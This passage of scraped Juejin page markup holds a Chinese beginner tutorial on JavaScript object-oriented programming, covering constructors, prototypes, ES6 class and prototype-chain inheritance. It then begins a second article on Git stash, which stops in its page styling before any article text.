content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-128.png~tplv-t2oaga2asx-image.image"/> <div itemprop="author" itemscope="itemscope" itemtype="http://schema.org/Person"><meta itemprop="name" content="随逸177"/> <meta itemprop="url" content="https://juejin.cn/user/1857514486118233"/></div> <div itemprop="publisher" itemscope="itemscope" itemtype="http://schema.org/Organization"><meta itemprop="name" content="掘金"/> <div itemprop="logo" itemscope="itemscope" itemtype="https://schema.org/ImageObject"><meta itemprop="url" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-white-180.png~tplv-t2oaga2asx-image.image"/> <meta itemprop="width" content="180"/> <meta itemprop="height" content="180"/></div></div> <h1 class="article-title" data-v-61fb5e44="">
            《拆解 JS OOP 难点：构造函数、原型、Class 的底层关联》
            <!----> <!----></h1> <div class="author-info-block block-hidden" data-v-61fb5e44=""><div class="author-info-box" data-v-61fb5e44=""><div class="author-name" data-v-61fb5e44=""><a href="/user/1857514486118233/posts" target="_blank" rel="" class="jj-link username username ellipsis" data-v-65b50b51="" data-v-292f6e48="" data-v-61fb5e44=""><span class="name" style="max-width:160px;" data-v-65b50b51="" data-v-292f6e48="">
    随逸177
  </span> <!----> <!----> <!----> </a></div> <div class="meta-box" data-v-61fb5e44=""><time datetime="2026-02-03T14:33:46.000Z" title="Tue Feb 03 2026 14:33:46 GMT+0000 (Coordinated Universal Time)" class="time" data-v-61fb5e44="">
                    2026-02-03
                  </time> <svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" class="read-icon" data-v-61fb5e44=""><path d="M7.90078 2.80078C4.49278 2.80078 1.74745 6.11672 0.800781 7.77469C1.74745 9.58339 4.49278 13.2008 7.90078 13.2008C11.3088 13.2008 14.0541 9.58339 15.0008 7.77469C14.0541 6.11672 11.3088 2.80078 7.90078 2.80078Z" stroke="currentColor" data-v-61fb5e44=""/><circle cx="7.89922" cy="8.00078" r="2.2" stroke="currentColor" data-v-61fb5e44=""/></svg> <span class="views-count" data-v-61fb5e44="">
                    0
                  </span> <span class="read-time" data-v-61fb5e44=""><svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" data-v-61fb5e44=""><rect width="16" height="16" fill="none" data-v-61fb5e44=""/><circle cx="8" cy="8" r="5.65625" stroke="#8A919F" data-v-61fb5e44=""/><path d="M7.69141 5.18652V8.30924H10.8141" stroke="#8A919F" stroke-linecap="round" stroke-linejoin="round" data-v-61fb5e44=""/></svg>
                    阅读5分钟
                  </span> <!----></div></div> <div style="flex:1;" data-v-61fb5e44=""/> <!----> <!----></div> <!----> <!----> <!----> <!----> <div id="article-root" itemprop="articleBody" class="main" data-v-61fb5e44=""><div class="article-viewer markdown-body result"><style>.markdown-body{word-break:break-word;line-height:1.75;font-weight:400;font-size:16px;overflow-x:hidden;color:#252933}.markdown-body h1,.markdown-body h2,.markdown-body h3,.markdown-body h4,.markdown-body h5,.markdown-body h6{line-height:1.5;margin-top:35px;margin-bottom:10px;padding-bottom:5px}.markdown-body h1{font-size:24px;line-height:38px;margin-bottom:5px}.markdown-body h2{font-size:22px;line-height:34px;padding-bottom:12px;border-bottom:1px solid #ececec}.markdown-body h3{font-size:20px;line-height:28px}.markdown-body h4{font-size:18px;line-height:26px}.markdown-body h5{font-size:17px;line-height:24px}.markdown-body h6{font-size:16px;line-height:24px}.markdown-body p{line-height:inherit;margin-top:22px;margin-bottom:22px}.markdown-body img{max-width:100%}.markdown-body hr{border:none;border-top:1px solid #ddd;margin-top:32px;margin-bottom:32px}.markdown-body code{word-break:break-word;border-radius:2px;overflow-x:auto;background-color:#fff5f5;color:#ff502c;font-size:.87em;padding:.065em .4em}.markdown-body code,.markdown-body pre{font-family:Menlo,Monaco,Consolas,Courier New,monospace}.markdown-body pre{overflow:auto;position:relative;line-height:1.75}.markdown-body pre&gt;code{font-size:12px;padding:15px 12px;margin:0;word-break:normal;display:block;overflow-x:auto;color:#333;background:#f8f8f8}.markdown-body a{text-decoration:none;color:#0269c8;border-bottom:1px solid #d1e9ff}.markdown-body a:active,.markdown-body a:hover{color:#275b8c}.markdown-body table{display:inline-block!important;font-size:12px;width:auto;max-width:100%;overflow:auto;border:1px solid #f6f6f6}.markdown-body thead{background:#f6f6f6;color:#000;text-align:left}.markdown-body tr:nth-child(2n){background-color:#fcfcfc}.markdown-body td,.markdown-body th{padding:12px 7px;line-height:24px}.markdown-body td{min-width:120px}.markdown-body blockquote{color:#666;padding:1px 23px;margin:22px 0;border-left:4px solid #cbcbcb;background-color:#f8f8f8}.markdown-body blockquote:after{display:block;content:""}.markdown-body blockquote&gt;p{margin:10px 0}.markdown-body ol,.markdown-body ul{padding-left:28px}.markdown-body ol li,.markdown-body ul li{margin-bottom:0;list-style:inherit}.markdown-body ol li .task-list-item,.markdown-body ul li .task-list-item{list-style:none}.markdown-body ol li .task-list-item ol,.markdown-body ol li .task-list-item ul,.markdown-body ul li .task-list-item ol,.markdown-body ul li .task-list-item ul{margin-top:0}.markdown-body ol ol,.markdown-body ol ul,.markdown-body ul ol,.markdown-body ul ul{margin-top:3px}.markdown-body ol li{padding-left:6px}.markdown-body .contains-task-list{padding-left:0}.markdown-body .task-list-item{list-style:none}@media (max-width:720px){.markdown-body h1{font-size:24px}.markdown-body h2{font-size:20px}.markdown-body h3{font-size:18px}}</style><style data-highlight="" data-highlight-key="juejin">.markdown-body pre,.markdown-body pre&gt;code.hljs{color:#333;background:#f8f8f8}.hljs-comment,.hljs-quote{color:#998;font-style:italic}.hljs-keyword,.hljs-selector-tag,.hljs-subst{color:#333;font-weight:700}.hljs-literal,.hljs-number,.hljs-tag .hljs-attr,.hljs-template-variable,.hljs-variable{color:teal}.hljs-doctag,.hljs-string{color:#d14}.hljs-section,.hljs-selector-id,.hljs-title{color:#900;font-weight:700}.hljs-subst{font-weight:400}.hljs-class .hljs-title,.hljs-type{color:#458;font-weight:700}.hljs-attribute,.hljs-name,.hljs-tag{color:navy;font-weight:400}.hljs-link,.hljs-regexp{color:#009926}.hljs-bullet,.hljs-symbol{color:#990073}.hljs-built_in,.hljs-builtin-name{color:#0086b3}.hljs-meta{color:#999;font-weight:700}.hljs-deletion{background:#fdd}.hljs-addition{background:#dfd}.hljs-emphasis{font-style:italic}.hljs-strong{font-weight:700}</style><h2 data-id="heading-0">JS面向对象OOP全解析：从原型到Class，告别模糊认知</h2>
<p>前言：很多前端新手学JS面向对象时，都会被“原型”“构造函数”“继承”绕晕——JS明明到处都是对象，却和Java、Python的OOP不一样；ES6的class看似简单，底层却藏着原型的逻辑。本文从JS的语言特性出发，拆解封装、原型、继承三大核心，用通俗案例讲透JS OOP的本质，适合入门同学夯实基础。</p>
<h3 data-id="heading-1">一、先厘清：JS是“基于对象”，而非纯粹“面向对象”</h3>
<p>面向对象（OOP）的核心是<strong>类（Class）</strong> 与<strong>实例（Instance）</strong> ，通过封装、继承、多态实现代码复用与扩展。但JS有个特殊之处：</p>
<p>它是一门<strong>基于对象（Object-based）</strong> 的语言——你接触到的几乎所有东西都是对象，哪怕是字符串、数字等简单数据类型，也有对应的包装类（如String、Number），能调用内置方法。</p>
<p>但它早期没有class关键字，也没有严格意义上的“类模板”，哪怕ES6新增了class，其底层依然是<strong>原型式面向对象</strong>，而非传统OOP的“类-实例”血缘关系。</p>
<p>那么问题来了：没有class和显式构造器，JS怎么实现面向对象？</p>
<h3 data-id="heading-2">二、封装：从对象字面量到构造函数</h3>
<p>封装的核心是“将属性和方法打包”，隐藏内部细节、暴露可控接口，同时解决实例创建的代码重复问题。JS实现封装，经历了从简单到规范的过程。</p>
<h4 data-id="heading-3">1. 原始模式：对象字面量</h4>
<p>最基础的创建对象方式，直接用字面量定义属性和方法，适合单个对象的场景：</p>
<pre><code class="hljs language-javascript" lang="javascript"><span class="hljs-comment">// 单个用户对象</span>
<span class="hljs-keyword">const</span> user1 = {
  <span class="hljs-attr">name</span>: <span class="hljs-string">"张三"</span>,
  <span class="hljs-attr">age</span>: <span class="hljs-number">18</span>,
  <span class="hljs-attr">sayHi</span>: <span class="hljs-keyword">function</span>(<span class="hljs-params"/>) {
    <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-string">`你好，我是<span class="hljs-subst">${<span class="hljs-variable language_">this</span>.name}</span>`</span>);
  }
};
user1.<span class="hljs-title function_">sayHi</span>(); <span class="hljs-comment">// 你好，我是张三</span>
</code></pre>
<p>缺点很明显：创建多个同类对象时，代码大量重复，且实例之间没有关联，无法体现“同属一个类”的关系。</p>
<h4 data-id="heading-4">2. 优化：构造函数封装实例化过程</h4>
<p>通过函数封装实例创建逻辑，用new关键字调用（构造函数约定首字母大写），实现批量创建实例，同时建立实例与构造函数的关联：</p>
<pre><code class="hljs language-javascript" lang="javascript"><span class="hljs-comment">// 构造函数：封装用户类的实例化逻辑</span>
<span class="hljs-keyword">function</span> <span class="hljs-title function_">User</span>(<span class="hljs-params">name, age</span>) {
  <span class="hljs-comment">// new调用时，会自动创建空对象，this指向这个空对象</span>
  <span class="hljs-variable language_">this</span>.<span class="hljs-property">name</span> = name; <span class="hljs-comment">// 给实例添加独有属性</span>
  <span class="hljs-variable language_">this</span>.<span class="hljs-property">age</span> = age;
  <span class="hljs-variable language_">this</span>.<span class="hljs-property">sayHi</span> = <span class="hljs-keyword">function</span>(<span class="hljs-params"/>) {
    <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-string">`你好，我是<span class="hljs-subst">${<span class="hljs-variable language_">this</span>.name}</span>`</span>);
  };
}

<span class="hljs-comment">// 创建两个实例</span>
<span class="hljs-keyword">const</span> user1 = <span class="hljs-keyword">new</span> <span class="hljs-title class_">User</span>(<span class="hljs-string">"张三"</span>, <span class="hljs-number">18</span>);
<span class="hljs-keyword">const</span> user2 = <span class="hljs-keyword">new</span> <span class="hljs-title class_">User</span>(<span class="hljs-string">"李四"</span>, <span class="hljs-number">20</span>);

user1.<span class="hljs-title function_">sayHi</span>(); <span class="hljs-comment">// 你好，我是张三</span>
user2.<span class="hljs-title function_">sayHi</span>(); <span class="hljs-comment">// 你好，我是李四</span>
</code></pre>
<p>关键细节：</p>
<ul>
<li>new调用构造函数时，会自动完成“创建空对象→绑定this→执行函数代码→返回对象”四步；</li>
<li>普通函数调用（无new）时，this指向window，会污染全局变量，务必注意调用方式；</li>
<li>可以通过instanceof判断实例归属：console.log(user1 instanceof User); // true。</li>
</ul>
<p>但这个方案仍有不足：每个实例的sayHi方法都会重新创建一份，占用额外内存——这就是原型要解决的问题。</p>
<h3 data-id="heading-5">三、原型（Prototype）模式：解决共享与内存浪费</h3>
<p>构造函数的独有属性/方法（如name、age）需要每个实例单独拥有，但公用属性/方法（如sayHi）没必要重复创建。JS通过原型，让所有实例共享公用资源。</p>
<h4 data-id="heading-6">1. 原型的核心逻辑</h4>
<p>每个函数都有一个<strong>prototype属性</strong>，其值是一个对象（原型对象）；构造函数的所有实例，都会通过私有属性__proto__（ES5推荐用Object.getPrototypeOf()）指向这个原型对象。</p>
<p>原型对象上的属性和方法，会被所有实例共享，且只在内存中存储一份。</p>
<h4 data-id="heading-7">2. 优化构造函数：公有方法放原型</h4>
<pre><code class="hljs language-javascript" lang="javascript"><span class="hljs-keyword">function</span> <span class="hljs-title function_">User</span>(<span class="hljs-params">name, age</span>) {
  <span class="hljs-comment">// 实例独有属性</span>
  <span class="hljs-variable language_">this</span>.<span class="hljs-property">name</span> = name;
  <span class="hljs-variable language_">this</span>.<span class="hljs-property">age</span> = age;
}

<span class="hljs-comment">// 公有方法/属性放原型上，所有实例共享</span>
<span class="hljs-title class_">User</span>.<span class="hljs-property"><span class="hljs-keyword">prototype</span></span>.<span class="hljs-property">sayHi</span> = <span class="hljs-keyword">function</span>(<span class="hljs-params"/>) {
  <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-string">`你好，我是<span class="hljs-subst">${<span class="hljs-variable language_">this</span>.name}</span>`</span>);
};
<span class="hljs-title class_">User</span>.<span class="hljs-property"><span class="hljs-keyword">prototype</span></span>.<span class="hljs-property">gender</span> = <span class="hljs-string">"未知"</span>; <span class="hljs-comment">// 共享属性</span>

<span class="hljs-keyword">const</span> user1 = <span class="hljs-keyword">new</span> <span class="hljs-title class_">User</span>(<span class="hljs-string">"张三"</span>, <span class="hljs-number">18</span>);
<span class="hljs-keyword">const</span> user2 = <span class="hljs-keyword">new</span> <span class="hljs-title class_">User</span>(<span class="hljs-string">"李四"</span>, <span class="hljs-number">20</span>);

<span class="hljs-comment">// 共享原型上的方法和属性</span>
user1.<span class="hljs-title function_">sayHi</span>(); <span class="hljs-comment">// 你好，我是张三</span>
user2.<span class="hljs-title function_">sayHi</span>(); <span class="hljs-comment">// 你好，我是李四</span>
<span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(user1.<span class="hljs-property">gender</span>, user2.<span class="hljs-property">gender</span>); <span class="hljs-comment">// 未知 未知</span>
</code></pre>
<h4 data-id="heading-8">3. 原型相关关键方法</h4>
<ul>
<li>isPrototypeOf()：判断原型对象是否属于某个实例 → User.prototype.isPrototypeOf(user1); // true；</li>
<li>hasOwnProperty()：判断属性是实例独有还是原型共享 → user1.hasOwnProperty("name"); // true（独有），user1.hasOwnProperty("gender"); // false（原型）；</li>
<li>in运算符：判断属性是否存在（实例或原型中） → "sayHi" in user1; // true。</li>
</ul>
<p>注意：如果实例上定义了与原型同名的属性，会优先使用实例的属性（原型查找的就近原则）。</p>
<h3 data-id="heading-9">四、ES6 Class：原型的语法糖</h3>
<p>ES6新增class关键字，让JS的OOP写法更贴近传统语言，但<strong>底层依然是原型机制</strong>，class只是简化了语法，没有改变本质。</p>
<pre><code class="hljs language-javascript" lang="javascript"><span class="hljs-comment">// ES6 Class写法</span>
<span class="hljs-keyword">class</span> <span class="hljs-title class_">User</span> {
  <span class="hljs-comment">// 构造器：对应ES5的构造函数</span>
  <span class="hljs-title function_">constructor</span>(<span class="hljs-params">name, age</span>) {
    <span class="hljs-variable language_">this</span>.<span class="hljs-property">name</span> = name;
    <span class="hljs-variable language_">this</span>.<span class="hljs-property">age</span> = age;
  }

  <span class="hljs-comment">// 原型上的方法（无需写prototype）</span>
  <span class="hljs-title function_">sayHi</span>(<span class="hljs-params"/>) {
    <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-string">`你好，我是<span class="hljs-subst">${<span class="hljs-variable language_">this</span>.name}</span>`</span>);
  }
}

<span class="hljs-keyword">const</span> user1 = <span class="hljs-keyword">new</span> <span class="hljs-title class_">User</span>(<span class="hljs-string">"张三"</span>, <span class="hljs-number">18</span>);
<span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(user1.<span class="hljs-property">__proto__</span> === <span class="hljs-title class_">User</span>.<span class="hljs-property"><span class="hljs-keyword">prototype</span></span>); <span class="hljs-comment">// true（底层还是原型）</span>
</code></pre>
<p>对比ES5的原型写法，class的优势是语法更简洁、语义更清晰，避免了手动操作prototype的繁琐，但核心逻辑完全一致。</p>
<h3 data-id="heading-10">五、继承：JS原型链与构造函数绑定</h3>
<p>继承是OOP的核心特性之一，让子类能复用父类的属性和方法，同时扩展自身功能。JS实现继承，核心是原型链和构造函数绑定。</p>
<h4 data-id="heading-11">1. 基础方案：构造函数绑定（apply/call）</h4>
<p>通过apply或call，将父类构造函数的this绑定到子类实例，实现父类属性的继承，但无法继承父类原型上的方法：</p>
<pre><code class="hljs language-javascript" lang="javascript"><span class="hljs-comment">// 父类：动物</span>
<span class="hljs-keyword">function</span> <span class="hljs-title function_">Animal</span>(<span class="hljs-params"/>) {
  <span class="hljs-variable language_">this</span>.<span class="hljs-property">species</span> = <span class="hljs-string">"动物"</span>;
}
<span class="hljs-comment">// 父类原型方法</span>
<span class="hljs-title class_">Animal</span>.<span class="hljs-property"><span class="hljs-keyword">prototype</span></span>.<span class="hljs-property">sayAnimal</span> = <span class="hljs-keyword">function</span>(<span class="hljs-params"/>) {
  <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-string">"我是动物"</span>);
};

<span class="hljs-comment">// 子类：狗</span>
<span class="hljs-keyword">function</span> <span class="hljs-title function_">Dog</span>(<span class="hljs-params">name</span>) {
  <span class="hljs-comment">// 绑定父类构造函数的this，继承父类属性</span>
  <span class="hljs-title class_">Animal</span>.<span class="hljs-title function_">apply</span>(<span class="hljs-variable language_">this</span>);
  <span class="hljs-variable language_">this</span>.<span class="hljs-property">name</span> = name;
}

<span class="hljs-keyword">const</span> dog1 = <span class="hljs-keyword">new</span> <span class="hljs-title class_">Dog</span>(<span class="hljs-string">"旺财"</span>);
<span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(dog1.<span class="hljs-property">species</span>); <span class="hljs-comment">// 动物（继承父类属性）</span>
dog1.<span class="hljs-title function_">sayAnimal</span>(); <span class="hljs-comment">// 报错（无法继承原型方法）</span>
</code></pre>
<h4 data-id="heading-12">2. 优化方案：原型链继承</h4>
<p>让子类的原型指向父类的实例，通过原型链实现“属性+方法”的全继承：</p>
<pre><code class="hljs language-javascript" lang="javascript"><span class="hljs-keyword">function</span> <span class="hljs-title function_">Animal</span>(<span class="hljs-params"/>) {
  <span class="hljs-variable language_">this</span>.<span class="hljs-property">species</span> = <span class="hljs-string">"动物"</span>;
}
<span class="hljs-title class_">Animal</span>.<span class="hljs-property"><span class="hljs-keyword">prototype</span></span>.<span class="hljs-property">sayAnimal</span> = <span class="hljs-keyword">function</span>(<span class="hljs-params"/>) {
  <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-string">"我是动物"</span>);
};

<span class="hljs-keyword">function</span> <span class="hljs-title function_">Dog</span>(<span class="hljs-params">name</span>) {
  <span class="hljs-title class_">Animal</span>.<span class="hljs-title function_">apply</span>(<span class="hljs-variable language_">this</span>); <span class="hljs-comment">// 继承父类属性</span>
  <span class="hljs-variable language_">this</span>.<span class="hljs-property">name</span> = name;
}

<span class="hljs-comment">// 子类原型指向父类实例，继承父类原型方法</span>
<span class="hljs-title class_">Dog</span>.<span class="hljs-property"><span class="hljs-keyword">prototype</span></span> = <span class="hljs-keyword">new</span> <span class="hljs-title class_">Animal</span>();

<span class="hljs-keyword">const</span> dog1 = <span class="hljs-keyword">new</span> <span class="hljs-title class_">Dog</span>(<span class="hljs-string">"旺财"</span>);
dog1.<span class="hljs-title function_">sayAnimal</span>(); <span class="hljs-comment">// 我是动物（成功继承原型方法）</span>
<span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(dog1.<span class="hljs-property">species</span>); <span class="hljs-comment">// 动物</span>
</code></pre>
<p>核心逻辑：子类实例的__proto__指向子类原型（父类实例），父类实例的__proto__指向父类原型，层层向上形成原型链，直到Object.prototype（原型链终点为null）。</p>
<h3 data-id="heading-13">六、总结：JS OOP的本质</h3>
<ol>
<li>JS是基于对象的语言，OOP底层依赖原型机制，而非传统类继承；</li>
<li>封装：通过构造函数/Class打包实例逻辑，区分独有与共享资源；</li>
<li>原型：解决公用方法的内存浪费，是实例共享资源的核心；</li>
<li>继承：通过构造函数绑定+原型链，实现父类属性与方法的复用；</li>
<li>ES6 Class是语法糖，没有改变原型的底层逻辑。</li>
</ol></div></div></article> <div class="article-end" data-v-539963b4="" data-v-61fb5e44=""><div class="rank-entry-bottom" data-v-539963b4="" data-v-61fb5e44=""><!----></div> <div class="tag-list-box" data-v-539963b4="" data-v-61fb5e44=""><!----><!----><!----></div></div> <!----><!----><!----><!----><!----><style>	.markdown-body { color: #828182;}</style>]]></description></item><item>    <title><![CDATA[Git暂存与stash操作详解]]></title>    <link>https://juejin.cn/post/7602420156397649963</link>    <guid>https://juejin.cn/post/7602420156397649963</guid>    <pubDate>2026-02-03T14:35:11.000Z</pubDate>    <description><![CDATA[<article itemscope="itemscope" itemtype="http://schema.org/Article" data-entry-id="7602420156397649963" data-draft-id="7600342201794150415" data-original-type="0" class="article" data-v-61fb5e44=""><!----> <meta itemprop="headline" content="Git暂存与stash操作详解"/> <meta itemprop="keywords" content="Git"/> <meta itemprop="datePublished" content="2026-02-03T14:35:11.000Z"/> <meta itemprop="image" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-128.png~tplv-t2oaga2asx-image.image"/> <div itemprop="author" itemscope="itemscope" itemtype="http://schema.org/Person"><meta itemprop="name" content="于小洋"/> <meta itemprop="url" content="https://juejin.cn/user/3292359784146536"/></div> <div itemprop="publisher" itemscope="itemscope" itemtype="http://schema.org/Organization"><meta itemprop="name" content="掘金"/> <div itemprop="logo" itemscope="itemscope" itemtype="https://schema.org/ImageObject"><meta itemprop="url" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-white-180.png~tplv-t2oaga2asx-image.image"/> <meta itemprop="width" content="180"/> <meta itemprop="height" content="180"/></div></div> <h1 class="article-title" data-v-61fb5e44="">
            Git暂存与stash操作详解
            <!----> <!----></h1> <div class="author-info-block block-hidden" data-v-61fb5e44=""><div class="author-info-box" data-v-61fb5e44=""><div class="author-name" data-v-61fb5e44=""><a href="/user/3292359784146536/posts" target="_blank" rel="" class="jj-link username username ellipsis" data-v-65b50b51="" data-v-292f6e48="" data-v-61fb5e44=""><span class="name" style="max-width:160px;" data-v-65b50b51="" data-v-292f6e48="">
    于小洋
  </span> <!----> <!----> <!----> </a></div> <div class="meta-box" data-v-61fb5e44=""><time datetime="2026-02-03T14:35:11.000Z" title="Tue Feb 03 2026 14:35:11 GMT+0000 (Coordinated Universal Time)" class="time" data-v-61fb5e44="">
                    2026-02-03
                  </time> <svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" class="read-icon" data-v-61fb5e44=""><path d="M7.90078 2.80078C4.49278 2.80078 1.74745 6.11672 0.800781 7.77469C1.74745 9.58339 4.49278 13.2008 7.90078 13.2008C11.3088 13.2008 14.0541 9.58339 15.0008 7.77469C14.0541 6.11672 11.3088 2.80078 7.90078 2.80078Z" stroke="currentColor" data-v-61fb5e44=""/><circle cx="7.89922" cy="8.00078" r="2.2" stroke="currentColor" data-v-61fb5e44=""/></svg> <span class="views-count" data-v-61fb5e44="">
                    10
                  </span> <span class="read-time" data-v-61fb5e44=""><svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" data-v-61fb5e44=""><rect width="16" height="16" fill="none" data-v-61fb5e44=""/><circle cx="8" cy="8" r="5.65625" stroke="#8A919F" data-v-61fb5e44=""/><path d="M7.69141 5.18652V8.30924H10.8141" stroke="#8A919F" stroke-linecap="round" stroke-linejoin="round" data-v-61fb5e44=""/></svg>
                    阅读10分钟
                  </span> <!----></div></div> <div style="flex:1;" data-v-61fb5e44=""/> <!----> <!----></div> <!----> <!----> <!----> <!----> <div id="article-root" itemprop="articleBody" class="main" data-v-61fb5e44=""><div class="article-viewer markdown-body result"><style>@charset "UTF-8";.markdown-body blockquote&gt;:first-child{margin-top:0}.markdown-body blockquote&gt;:last-child{margin-bottom:0}.markdown-body{overflow:hidden;line-height:1.75;font-size:15px;background-image:linear-gradient(90deg,rgba(72,42,10,.05) 5%,rgba(72,42,10,0) 0),linear-gradient(1turn,rgba(72,42,10,.05) 5%,rgba(72,42,10,0) 0);background-size:20px 20px;background-position:50%;padding-top:0!important}.markdown-body h1,.markdown-body h2,.markdown-body h3,.markdown-body h4,.markdown-body h5,.markdown-body h6{line-height:1.5;margin-bottom:10px;padding-bottom:5px}.markdown-body h1{position:relative;display:flex;border-bottom:5px solid #6d4e00;line-height:35px;letter-spacing:1px;font-size:25px;padding-left:25px;color:#664900;text-shadow:1px 1px 1px #8a6200;padding-bottom:0}.markdown-body h1:before{content:"";display:flex;position:absolute;left:0;top:3px;bottom:0;margin:auto;width:20px;height:20px;background-size:20px 20px;background-image:url("data:image/png;base64,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